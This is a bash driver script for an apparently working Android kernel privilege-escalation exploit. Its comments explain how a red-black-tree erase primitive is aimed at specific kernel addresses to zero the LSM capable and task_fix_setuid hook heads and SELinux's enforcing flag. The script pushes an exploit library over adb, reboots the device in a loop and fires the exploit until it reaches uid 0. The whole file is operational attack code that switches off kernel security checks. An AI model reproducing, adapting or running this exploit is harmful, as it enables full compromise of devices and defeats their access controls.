#!/usr/bin/env bash
# root3.sh -- fire the three-zero-store root program across fresh boots.
#
# Each punch with W=K+1, V=0 is the CLEAN zero-store shape:
#   the plant is pc = W-4 = K-3, rb_right = V = 0, rb_left = 0, so
#   __rb_erase_augmented() takes case 1 (tmp==0): child==NULL means the only
#   store is __rb_change_child()'s fall-through arm, which writes into
#   parent+4 = ((K-3)&~3)+4 = K -- exactly the word we want cleared -- and
#   `rebalance = __rb_is_black(pc) ? parent : NULL` is NULL because pc is odd,
#   so ____rb_erase_color() NEVER runs: no rebalance, no collateral writes.
# (W=K+4/V=0 with W=4 was the other candidate; this one reuses the V=0 geometry
# that already landed for selinux_state and the capable head in earlier fires.)
#
#   c17ab57c  security_hook_heads.capable          -> 0 : security_capable()'s
#               own codegen (c04da15c) answers `mov r0,#0` on an empty list, so
#               every ns_capable(CAP_SETUID/SETGID/...) in the kernel ALLOWs.
#   c17ab700  security_hook_heads.task_fix_setuid  -> 0 : cap2 proved zeroing the
#               capable head alone still left setuid(0) at EPERM, and the only
#               remaining gate on that path is this transition hook (SELinux).
#   c1d5a724  selinux_state.enforcing              -> 0 : permissive, so the rest
#               of the SELinux gates stop denying and root is actually usable.
#
# The order is deliberate.  At most ~3 punches reach rb_erase in one boot (the
# first erase unlinks the ghost from the real pi_waiters link), so the two most
# valuable clears come FIRST: with only `capable` and `enforcing` landed we still
# get uid 0 (permissive makes selinux_task_fix_setuid()'s avc check return 0) AND
# a permissive box, which is what lets the su install and adbd restart work.
# task_fix_setuid's head is the belt-and-braces third store.
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
cd "$(dirname "$0")" || exit 1
CAP=c17ab57d      # K=0xc17ab57c + 1
SUID=c17ab701     # K=0xc17ab700 + 1
ENF=c1d5a725      # K=0xc1d5a724 + 1
P="$CAP=00000000,$ENF=00000000,@$SUID=00000000"
OUT=captures/root3.out
mkdir -p captures

online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() {
  local m=${1:-300} w=0
  while ! online; do
    sleep 10
    w=$((w + 10))
    [ $((w % 300)) -eq 0 ] && say "still waiting for USB ($w s of $m s)"
    [ $w -ge "$m" ] && return 1
  done
  return 0
}
waitboot() {
  local m=${1:-240} w=0 g
  while :; do
    g=$($ADB shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')
    [ "$g" = "1" ] && break
    sleep 5
    w=$((w + 5))
    [ $w -ge "$m" ] && return 1
  done
  sleep 8
  return 0
}

say() { echo "[$(date +%H:%M:%S)] $*" | tee -a "$OUT"; }

say "waiting for the device to come back on USB (up to 45 min)"
waitdev 2700 || { say "NO-DEVICE after 45 min"; exit 1; }
say "device online; pushing preload.so"
$ADB push exploit/preload.so $DT/preload.so >/dev/null 2>&1
$ADB shell "cat $DT/fire.sh" >/dev/null 2>&1 || \
  $ADB push fire.sh $DT/fire.sh >/dev/null 2>&1
$ADB shell "chmod 755 $DT/fire.sh" >/dev/null 2>&1

for r in 1 2 3 4 5 6 7 8; do
  say "=== round $r: reboot for a clean slot/ghost state"
  $ADB reboot >/dev/null 2>&1
  sleep 80
  waitdev 300 || { say "round $r: device never came back (wedged boot?) -- waiting longer";
                   waitdev 900 || { say "round $r: STILL no device; giving up"; exit 1; }; }
  waitboot 300 || say "round $r: boot_completed never set (continuing anyway)"
  say "round $r: getenforce=$($ADB shell getenforce 2>/dev/null | tr -d '\r') optmem=$($ADB shell cat /proc/sys/net/core/optmem_max 2>/dev/null | tr -d '\r')"
  bash atd_fire.sh "rt$r" GHOSTLOCK_WALKSAFE=1 GHOSTLOCK_WS_TARGET=st \
    GHOSTLOCK_WBASE=4 GHOSTLOCK_ATTEMPTS=3 GHOSTLOCK_STAT_PLIST="$P" \
    >>"$OUT" 2>&1
  say "round $r: after fire getenforce=$($ADB shell getenforce 2>/dev/null | tr -d '\r')"
  grep -aE 'WS-DONE|no punch landed|STAT-ROOT|HIJ-IDS|HIJ-ENFORCE|HIJ-CAPSET|HIJ-DAC|STAT-AFTER|exploit finished' \
    "captures/rt$r.log" 2>/dev/null | tail -22 | tee -a "$OUT"
  if grep -aqE 'HIJ-IDS .*-> uid=0|STAT-AFTER uid=0' "$OUT" 2>/dev/null; then
    say "ROUND $r REACHED UID 0 -- root; stopping the loop"
    exit 0
  fi
done
say "no root after 8 rounds"
exit 1
